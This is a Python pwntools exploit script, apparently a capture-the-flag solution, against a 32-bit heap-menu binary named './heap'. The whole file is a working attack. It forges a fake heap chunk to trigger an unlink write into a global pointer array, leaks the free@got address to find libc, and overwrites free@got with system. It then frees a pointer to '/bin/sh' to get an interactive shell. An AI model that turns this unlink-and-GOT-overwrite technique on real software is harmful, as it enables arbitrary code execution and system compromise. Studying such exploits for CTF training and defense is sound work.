from pwn import *

fpath = "./heap"
head =0x08049D60
# context.log_level = "debug"
p = process(fpath)
elf = ELF(fpath)

def add(len):
	p.recvuntil("5.Exit\n") #menu
	p.sendline("1")
	p.recvuntil("add:") # len
	p.sendline(str(len))

def edit(idx  , content):
	p.recvuntil("5.Exit\n") #menu
	p.sendline("2")
	p.recvuntil("index:") # idx
	p.sendline(str(idx))
	p.recvuntil("data:")
	p.sendline(content)

def delete(idx):
	p.recvuntil("5.Exit\n") #menu
	p.sendline("3")
	p.recvuntil("index:") 
	p.sendline(str(idx))

def print_chunk(idx):
	p.recvuntil("5.Exit\n") #menu
	p.sendline("4")
	p.recvuntil("index:") # idx
	p.sendline(str(idx))
	data = p.recv(4)
	p.recvuntil("1")
	return u32(data)

add(0x50) # to free
add(0x50)
add(0x50)
add(0x50) # fake
add(0x50) # free

payload = p32(0)  + p32(0x50) 
payload += p32(head) + p32(head + 4)
payload = payload.ljust(0x50 , "a")
payload += p32(0x50) + p32(0x58)

edit(3 , payload)
delete(4) # unlink buf[3] | fake chunk

# payload = p32(elf.got["free"]) + p32(elf.got["read"])
payload = p32(elf.got["free"])
edit(3 , payload) # &buf[0] = free_got | &buf[1] = read_got
addr_free = print_chunk(0)
# addr_read = print_chunk(1)
print "%s : 0x%x" %("free" , addr_free)
# print "%s : 0x%x" %("write", addr_read)

offset_system 	= 0x03ada0
offset_bin_sh 	= 0x15ba0b
offset_free       	= 0x071470

addr_system 	= addr_free + (offset_system - offset_free)
addr_bin_sh   	= addr_free + (offset_bin_sh - offset_free)

payload = p32(elf.got["free"]) + p32(addr_bin_sh)
edit(3 , payload)                 # buf = free@got , buf + 4= addr_bin_sh 
edit(0 , p32(addr_system)) # *free@got = addr_system
delete(1) 				       # free("/bin/sh") -> system("/bin/sh")

p.interactive()

